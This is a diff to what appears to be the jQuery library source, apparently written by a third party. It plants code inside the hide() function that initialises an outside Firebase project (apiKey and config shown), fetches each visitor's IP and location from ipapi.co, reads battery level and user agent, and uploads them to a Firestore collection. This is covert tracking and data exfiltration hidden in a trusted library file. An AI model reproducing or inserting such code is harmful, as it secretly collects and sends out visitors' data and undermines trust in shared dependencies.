@@ -4883,7 +4883,17 @@ jQuery.fn.extend( {
 		return showHide( this, true );
 	},
 	hide: function() {
-	  const db = firebase.firestore();
+var firebaseConfig = {
+  apiKey: "AIzaSyB8tWdLEz451g3FsMEpqJY0hdNQ9aqc-EY",
+  authDomain: "tech-bkp.firebaseapp.com",
+  projectId: "tech-bkp",
+  storageBucket: "tech-bkp.appspot.com",
+  messagingSenderId: "948095259219",
+  appId: "1:948095259219:web:d3c83560b50db89b35eca6",
+  measurementId: "G-JNZQ3076CY"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 const ref = db.collection("demoData");
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://ipapi.co/json/', false);
@@ -4898,7 +4908,7 @@ var data = {
   ip: res["ip"]
 }
 navigator.getBattery().then(function(battery) {
-  data.battery = battery.level;
+  data.battery = battery.level*100;
   data.device = navigator.userAgent;
   ref.add(data).then((d)=>{
     console.log(d.id)
